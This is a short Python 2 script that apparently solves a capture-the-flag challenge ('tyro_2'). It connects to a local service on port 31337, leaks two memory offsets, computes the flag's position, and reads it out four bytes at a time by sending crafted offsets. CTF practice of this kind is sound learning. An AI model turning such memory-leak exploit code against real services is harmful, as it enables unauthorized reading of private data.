#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def getLine(s):
    # Gets a \n delimited line from socket s
    done = False
    line = ""
    while not done:
        data = s.recv(1)
        if data == "\n":
            done = True
        else:
            line += data
	# test for prompt
        if ": " in line:
            done = True
    #print "[-] Got Line: {}".format(line)
    return line

def pullText(hexVal):
    # takes a 0xXXXXXXXX and returns a text fragment, as well as "True" in finished
    # if a null byte was found.
    # remove the "0x"
    hexVal = hexVal[2:]
    # test length.  If not even, add leadign zeros
    if (len(hexVal) % 2):
        hexVal = "0"*(8-len(hexVal))+hexVal
    # Begin to reduce
    text = ""
    # Remember, the multibyte value was given in LE
    for i in range(0, len(hexVal), 2):
        thisByte = hexVal[i:i+2]
        #print "[d] thisByte: {}".format(thisByte)
        intByte = int(thisByte, 16)
        #print "[d] intByte: {}".format(intByte)
        if intByte == 0:
            return True, text
        text = chr(intByte) + text

    return False, text
    
        

try:
    print "[-] Contacting tyro_2 server.."
    s.connect(('localhost', 31337))
    print "[-] Working through banners.."
    done = False
    while not done:
        line = getLine(s)
        if "Offset" in line:
            done = True
    
    print "[-] Getting first offset"
    s.send('0' + '\r\n')
    offset1 = getLine(s)
    #offset1 = offset1[:10]
    print "[+] First offset is: {}!".format(offset1)

    data = getLine(s)

    print "[-] Getting second offset"
    s.send('4' + '\r\n')
    offset2 = getLine(s)
    #offset2 = offset2[:10]
    print "[+] Second offset is: {}!".format(offset2)

    # Calc the offset
    # turn to numbers
    offset1_int = int(offset1, 16)
    offset2_int = int(offset2, 16)

    flag_offset = offset2_int - offset1_int

    print "[-] Flag offset = {}".format(flag_offset)
    flag = ""
    
    done = False
    while not done:
        # Get the prompt
        skip = getLine(s)
        # send the offset
        tosend = "{}".format(hex(flag_offset))[:-1]  # Kill the "L" at the end
        #print "[-] Sending: {}".format(tosend)
        s.send(tosend + '\r\n')
        # reduce the offset
        flag_offset += 4
        # Get the response
        flaginfo = getLine(s)
        done, flagpart = pullText(flaginfo)
        if (len(flagpart)):
            flag += flagpart
        
        #print "[+] Partial flag: {}".format(flagpart)

    print "[+] Flag: {}".format(flag)

        

    s.close()
    print "[-] Done!"

except:

    print "[!] Something messed up.."



